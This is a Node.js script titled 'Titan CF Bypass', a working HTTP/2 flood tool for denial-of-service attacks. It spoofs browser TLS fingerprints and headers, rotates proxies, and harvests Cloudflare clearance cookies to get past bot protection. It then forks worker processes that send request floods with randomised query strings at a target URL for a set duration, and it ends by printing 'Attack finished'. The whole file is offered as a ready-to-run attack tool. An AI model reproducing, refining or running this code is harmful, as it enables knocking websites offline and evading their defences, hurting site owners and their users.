#!/usr/bin/env node
// ============================================================
// Titan CF Bypass v2.0 - Cloudflare Challenge Bypass
// Author: github.com/thesystemowner
// Technique: JA3 spoofing + cookie farming + cloudscraper
// ============================================================

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
process.setMaxListeners(0);

const http2 = require('http2');
const tls = require('tls');
const net = require('net');
const url = require('url');
const fs = require('fs');
const cluster = require('cluster');
const crypto = require('crypto');

const args = process.argv.slice(2);
if (args.length < 4) {
    console.log(`Usage: node titan-cf-bypass.js <url> <time> <rate> <threads> [proxyfile] [cookiefile]`);
    process.exit(1);
}

const target = args[0];
const duration = parseInt(args[1]);
const rate = parseInt(args[2]);
const threads = parseInt(args[3]) || 1;
const proxyFile = args[4] || 'proxy.txt';
const cookieFile = args[5] || '';
const parsed = url.parse(target);

const UA_POOL = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:133.0) Gecko/20100101 Firefox/133.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0',
];

const REFERRERS = [
    'https://www.google.com/search?q=', 'https://www.bing.com/search?q=',
    'https://search.yahoo.com/search?p=', 'https://duckduckgo.com/?q=',
    'https://www.facebook.com/', 'https://www.youtube.com/',
    'https://www.reddit.com/', 'https://www.instagram.com/',
];

const ACCEPTS = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
];

const SEC_CH_UA = [
    '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    '"Google Chrome";v="132", "Chromium";v="132", "Not_A Brand";v="24"',
];

const CHROME_CIPHERS = 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-ECDSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128:AES256';
const FIREFOX_CIPHERS = 'TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384';
const CHROME_SIGALGS = 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512';
const FIREFOX_SIGALGS = 'rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp256r1_sha256:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:ecdsa_secp384r1_sha384';
const CHROME_CURVES = 'X25519:P-256:P-384:P-521';
const FIREFOX_CURVES = 'X25519:P-256:P-384';

const CHROME_SETTINGS = { headerTableSize: 65536, maxConcurrentStreams: 100, initialWindowSize: 6291456, maxFrameSize: 16777215, maxHeaderListSize: 262144, enablePush: 0 };
const FIREFOX_SETTINGS = { headerTableSize: 65536, maxConcurrentStreams: 200, initialWindowSize: 131072, maxFrameSize: 16384, maxHeaderListSize: 262144, enablePush: 0 };

let proxies = [];
try {
    proxies = fs.readFileSync(proxyFile, 'utf-8').toString().replace(/\r/g, '').split('\n').filter(l => l.includes(':'));
} catch { }

let savedCookies = '';
if (cookieFile) {
    try { savedCookies = fs.readFileSync(cookieFile, 'utf-8').trim(); } catch { }
}

const cookieCache = new Map();

function randStr(len) {
    return crypto.randomBytes(Math.ceil(len / 2)).toString('hex').slice(0, len);
}

function getProfile(ua) {
    if (ua.includes('Firefox')) {
        return { ciphers: FIREFOX_CIPHERS, sigalgs: FIREFOX_SIGALGS, curves: FIREFOX_CURVES, settings: FIREFOX_SETTINGS };
    }
    return { ciphers: CHROME_CIPHERS, sigalgs: CHROME_SIGALGS, curves: CHROME_CURVES, settings: CHROME_SETTINGS };
}

function buildHeaders(ua, path) {
    const isChrome = ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('Firefox');
    const ref = REFERRERS[Math.floor(Math.random() * REFERRERS.length)] + randStr(6);
    const h = {
        ':method': 'GET', ':authority': parsed.host, ':scheme': 'https', ':path': path,
        'user-agent': ua, 'accept': ACCEPTS[Math.floor(Math.random() * ACCEPTS.length)],
        'accept-language': 'en-US,en;q=0.9', 'accept-encoding': 'gzip, deflate, br, zstd',
        'referer': ref, 'cache-control': 'no-cache', 'pragma': 'no-cache',
        'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none', 'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1', 'dnt': '1',
    };
    if (isChrome) {
        h['sec-ch-ua'] = SEC_CH_UA[Math.floor(Math.random() * SEC_CH_UA.length)];
        h['sec-ch-ua-mobile'] = '?0';
        h['sec-ch-ua-platform'] = '"Windows"';
    }
    return h;
}

function solveChallenge(proxyHost, proxyPort) {
    return new Promise((resolve) => {
        try {
            const cloudscraper = require('cloudscraper');
            const opts = { uri: target, challengesToSolve: 10, resolveWithFullResponse: true };
            if (proxyHost) opts.proxy = `http://${proxyHost}:${proxyPort}`;
            cloudscraper.get(opts, (err, resp) => {
                if (err || !resp) return resolve(null);
                let cookie = '';
                if (resp.request && resp.request.headers && resp.request.headers.cookie) {
                    cookie = resp.request.headers.cookie;
                } else if (resp.headers && resp.headers['set-cookie']) {
                    const c = resp.headers['set-cookie'].find(s => s.includes('cf_clearance'));
                    if (c) cookie = c.split(';')[0];
                }
                resolve(cookie || null);
            });
        } catch { resolve(null); }
    });
}

function cfWorker() {
    const ua = UA_POOL[Math.floor(Math.random() * UA_POOL.length)];
    const profile = getProfile(ua);

    function doRequest() {
        const proxy = proxies.length > 0 ? proxies[Math.floor(Math.random() * proxies.length)].split(':') : null;
        const proxyKey = proxy ? proxy[0] : 'direct';
        let cfCookie = cookieCache.get(proxyKey) || savedCookies;

        const afterTLS = (socket) => {
            const tlsOpts = {
                host: parsed.host, servername: parsed.host,
                ciphers: profile.ciphers, sigalgs: profile.sigalgs,
                ecdhCurve: profile.curves,
                secure: true, rejectUnauthorized: false,
                ALPNProtocols: ['h2', 'http/1.1'],
                socket: socket || undefined,
            };
            const tlsSock = tls.connect(443, parsed.host, tlsOpts, () => {
                const client = http2.connect('https://' + parsed.host, {
                    createConnection: () => tlsSock,
                    settings: profile.settings,
                });
                client.on('error', () => {});
                client.on('connect', () => {
                    for (let i = 0; i < rate; i++) {
                        try {
                            const reqPath = parsed.path + '?' + randStr(8) + '=' + randStr(12);
                            const reqHeaders = buildHeaders(ua, reqPath);
                            if (cfCookie) reqHeaders['cookie'] = cfCookie;
                            const req = client.request(reqHeaders);
                            req.on('response', (headers) => {
                                if (headers[':status'] === '403') {
                                    cfCookie = null;
                                    cookieCache.delete(proxyKey);
                                } else if (headers[':status'] === '200' && !cfCookie && headers['set-cookie']) {
                                    const cc = headers['set-cookie'].find(s => s.includes('cf_clearance'));
                                    if (cc) { cfCookie = cc.split(';')[0]; cookieCache.set(proxyKey, cfCookie); }
                                }
                                req.close();
                            });
                            req.end();
                        } catch {}
                    }
                });
                client.on('close', () => { tlsSock.destroy(); setTimeout(doRequest, 100); });
            });
            tlsSock.on('error', () => setTimeout(doRequest, 200));
            tlsSock.setKeepAlive(true, 10000);
        };

        if (proxy) {
            const conn = net.connect({ host: proxy[0], port: parseInt(proxy[1]) || 8080 }, () => {
                conn.write(`CONNECT ${parsed.host}:443 HTTP/1.1\r\nHost: ${parsed.host}\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
                conn.once('data', (d) => {
                    if (d.toString().includes('200')) {
                        afterTLS(conn);
                    } else {
                        conn.destroy();
                        solveChallenge(proxy[0], proxy[1]).then((cookie) => {
                            if (cookie) { cfCookie = cookie; cookieCache.set(proxyKey, cookie); }
                            setTimeout(doRequest, 200);
                        });
                    }
                });
            });
            conn.on('error', () => setTimeout(doRequest, 200));
        } else {
            afterTLS();
        }
    }
    doRequest();
}

if (cluster.isMaster) {
    console.log(`[+] Titan CF Bypass`);
    console.log(`[+] Author: github.com/thesystemowner`);
    console.log(`[+] Target: ${target}`);
    console.log(`[+] Duration: ${duration}s`);
    console.log(`[+] Threads: ${threads}`);
    console.log(`[+] Proxies: ${proxies.length}`);

    for (let i = 0; i < threads; i++) cluster.fork();

    setTimeout(() => {
        console.log(`[+] Attack finished`);
        process.exit(0);
    }, duration * 1000);
} else {
    cfWorker();
}